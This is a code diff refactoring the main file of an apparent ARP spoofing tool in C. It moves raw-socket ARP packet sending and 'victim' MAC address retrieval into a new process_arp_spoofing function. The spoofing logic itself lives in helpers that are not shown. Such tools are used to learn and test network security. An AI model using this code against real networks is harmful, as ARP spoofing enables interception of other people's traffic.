@@ -8,47 +8,34 @@
 #include <net/if.h>
 #include "arp.h"
 
+unsigned char *process_arp_spoofing(char *packet,
+    struct sockaddr_ll *arp_sockaddr)
+{
+    int arp_socket = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
+    char buffer[PACKET_LEN];
+    ssize_t len = 0;
+
+    if (sendto(arp_socket, packet, PACKET_LEN, 0,
+        (struct sockaddr *) arp_sockaddr, sizeof(*arp_sockaddr)) < 0)
+        return NULL;
+    len = recv(arp_socket, buffer, PACKET_LEN, 0);
+    if (len == 0)
+        return NULL;
+    return retrieve_mac_addr_from_frame(buffer);
+}
+
 int main(int ac, char **av)
 {
     params_t *params = parse(ac, av);
-    int _socket = create_socket();
-    arp_hdr_t *arp = create_arp_paquet(params, _socket);
-    uint8_t *packet = create_sendable_packets(arp);
+    int local_socket = create_socket();
+    struct sockaddr_ll *arp_sockaddr = create_arp_socketaddr(params);
+    arp_hdr_t *arp = create_arp_paquet(params, local_socket);
+    char *packet = create_sendable_packets(arp, arp_sockaddr, params);
+    unsigned char *victim_mac_addr = NULL;
 
-    struct sockaddr_ll sock;
-
-    sock.sll_family = AF_PACKET;
-    sock.sll_hatype = ARPHRD_ETHER;
-    sock.sll_protocol = htons(ETH_P_ARP);
-    sock.sll_pkttype = IFF_BROADCAST;
-    sock.sll_ifindex = if_nametoindex(params->interface);
-
-    _socket = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
-
-    sendto(_socket, packet, PACKET_LEN, 0, (const struct sockaddr *) &sock, sizeof(sock));
-
-    printf("ARP packet sent\n");
-
-    uint8_t *recvpacket = malloc(sizeof(uint8_t) * IP_MAXPACKET);
-    arp_hdr_t *arp_hdr = (arp_hdr_t *)(recvpacket + PACKET_LEN);
-
-    while (true) {
-        recv(_socket, recvpacket, IP_MAXPACKET, 0);
-        if (ntohs(arp_hdr->opcode) == ARPOP_RREPLY)
-            break;
-        else {
-            printf ("\nVictim mac address received:\n");
-            for (int i=0; i<6; i++)
-                printf ("%02x:", recvpacket[i + 6]);
-            memset(recvpacket, 0, IP_MAXPACKET);
-            printf("Received wrong ARP, trying again...\n");
-        }
-    }
-    printf ("\nVictim mac address received:\n");
-    for (int i=0; i<6; i++)
-        printf ("%02x:", recvpacket[i + 6]);
-
-
+    close(local_socket);
+    victim_mac_addr = process_arp_spoofing(packet, arp_sockaddr);
+    print_victim_mac_addr(victim_mac_addr);
     delete_params(params);
     return 0;
 }
